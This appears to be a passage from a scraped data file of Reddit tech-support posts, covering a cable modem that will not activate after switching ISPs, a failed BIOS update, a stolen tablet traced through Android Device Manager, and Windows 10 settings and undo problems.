My friend just bought the exact same modem and is planning on using it with TWC but I want to borrow it and make sure it works on WOW to possibly confirm/debunk the TWC firmware issue.  

IF it turns out that TWC does install proprietary firmware on my modem preventing me from using it with other ISPs, is there anyway I can overwrite my modem's firmware? If not is there any chance for me to get TWC to admit fault(HA!) and reimburse me for my now bricked modem?  

Thanks in advance for any insight. I really have a feeling I'm being played by an ISP(what are the odds!). I'm just not sure which one.  
  
  
**Update:**  
After doing some more research based on your responses (you guys are all awesome btw) I realized that the firmware build time was BEFORE it was connected with TWC so therefore they didn't install firmware on my modem.  

With this in mind I will say that I ended service with TWC and disconnected my modem before my service was physically cut off (They provided internet for an additional 12 days after I made the call to end service). Would this cause issues with my modem as it likely never received an end of service packet. Would that prevent it from attaining new activation packets (even though it was factory reset?).

**Update 2:**  
I called TWC and they have confirmed that my modem has been removed from their lists and they are no longer claiming it as under their jurisdiction.  

As suggested I will reach out to WOW again and see if I can't get some answers here.


**Update 3:**  
I've been on the phone with Arris and WOW again. Arris claims my downstream power level (10dBmV) is way too low for the modem (can anyone confirm this? I checked online and that seems to be reasonable). They did say that they are getting a lot of calls from WOW customers with my exact issue and that some have had success by escalating at WOW. So that's what I did.  

WOW Supervisors were still unable to connect to my modem and told me there was nothing they could do. So I'm back to square one. I'm still going to wait and test out my buddy's modem and see if it in fact my modem that is the issue.  

**Update 4:**
Tested a friend's brand new same model Arris Modem which connected just fine so since I was real sick of all the finger pointing I ended up cashing in on Arris's Warrenty Policy. They're sending me a new one which I expect will work just fine. I'm sorry I wasn't able to see this to it's conclusion but at this point I just want a working modem. Bummer one of the ISPs didn't have to pay as I still believe it is one of their faults :/

Edit:

4xp631,"Guys, I am extremely stupid and need your help","I don't know what was I thinking but yesterday I was trying to make a BIOS update and it went really bad. During the update my pc restarted and got stuck in **""Main BIOS checksum error, retrieving recovery source from HPA...**"" loop. After displaying this text it rebooted to display it again and again and again. I was trying to look for the solution online for the whole night and nothing helped, it got even worse. I tried taking out the CMOS battery out as some of the people did when having issues like that but after that my pc was not displaying anything. When i turned it on the fans were spinning, I could hear the HDD working and stuff but all I could see is a black screen and nothing happening. So I tried taking out RAM cards leaving only one, I plugged in a speaker to the MoBo but there were no POST beeps. I tried taking out the GPU but I don't know what should I do now, nothing seems to help me so I am asking you guys for help. Help me please because I am literally typing that from a [shoe box](https://imgur.com/sLKyGBp). My specs are: Gigabyte GA-MA770T-UD3P, AMD Athlon 2XII 245, nVidia GeForce GTX 650 Windforce 1024MB GDDR5, 4x1GB RAM Kingston, PSU Chieftec CFT-650-14C and WD HDD 1TB (i know that's quite old hardware) and the OS was Windows 10 if that matters.

4w7kww,"House got broken into, they stole a tablet that I can track down through Android Device Manager, can I find its exact location?","Recently posted on legaladvice but this turned into more of a technological question.

I live in Montreal, Quebec and my house was broken into today. They stole various items, cash and as well as my grandfather's tablet. However, I am able to track it down and I believe it is one of my neighbors for these reasons: It can be located through Android Device Manager and it is on my street. It is still connected to my wifi. Therefore, I know it is probably one of my neighbors who broke into my house but I am out of options. My police station told me I can't really do anything because I don't know EXACTLY who it is and there is no evidence. I don't have any cameras installed. I have home insurance so I can probably get some money back from the items they stole but I really can't sit here and do nothing. It's more about punishing the person that robbed me. I know I can ring the tablet but once I ring it, that will alert the burglar and he will probably turn it off. 

Is there a way to find the exact location of the device?

EDIT: They can't get a warrant because the Android Device Manager doesn't track down exact locations and it could be either one of these houses next to me.

EDIT2: I have just asked two of my closest neighbors and they said they haven't seen anything. I also do suspect this was a planned robbery due to various reasons (would like to not discuss due to privacy issues).

EDIT3: Knowing that it is still connected to my wifi, I was searching up if I can somehow triangulate the exact location of the tablet and I heard its possible if the device is connected through wifi. However, I can't really understand what to do as many of the options aren't explained very well so if anyone is knowledgeable in this matter. Please let me know! Thanks!

FINAL UPDATE: Police were unable to hear the tablet as I rung it. Thus, there is no longer any evidence and the tablet is now shut off. I no longer have access to it and I know that the robber is still in my vicinity but I can't do anything about it anymore. However, I am glad that I have home insurance and most of the damages are insured!",https://www.reddit.com/r/techsupport/comments/4w7kww/house_got_broken_into_they_stole_a_tablet_that_i/,1470354531.0,76,0.97,62,techsupport,Wundrous
4vpa5t,How do I get windows 10 to quit fucking with my settings?,"About every single restart, my background gets changed from two unique pictures to the same individual picture. 
After a major update, i have the windows 10 logo as a background
anything i do at all in windows tweaker gets reverted (removing the shortcut icon from shortcuts, for example)
it auto installs and restarts updates sometimes, even after i tell it not to. This is especially a problem because i think a new security update is giving me a WHEA_uncorrectable

Is there a way i can get windows to stop changing my settings so much after every update?

4vcz5j,Windows 10 'undo' deleted an ENTIRE FOLDER and it's contents.,"Long story short I'd done some work earlier in the day, created a new folder ect ect. Later on that day I was browsing folders and accidentally moved a folder. Anyway I clicked undo, once then twice. Not only did it undo the move, but for whatever unbelievably fucking inane reason  it deleted the entire folder I'd created earlier today and every single file in said folder.

I've looked up online and gotten absolutely nothing. The folder is gone, it's not even in the recycling bin. I don't have file history on so I can get it back. 

The only proof of it's existence is the file names saved in the ""Recently Opened"" tab in Photoshop. Any help with this fucking stupid flaw in Windows 10 would be appreciated.

Also the redo option is greyed out. Typically.",https://www.reddit.com/r/techsupport/comments/4vcz5j/windows_10_undo_deleted_an_entire_folder_and_its/,1469898953.0,52,0.9,14,techsupport,[deleted]
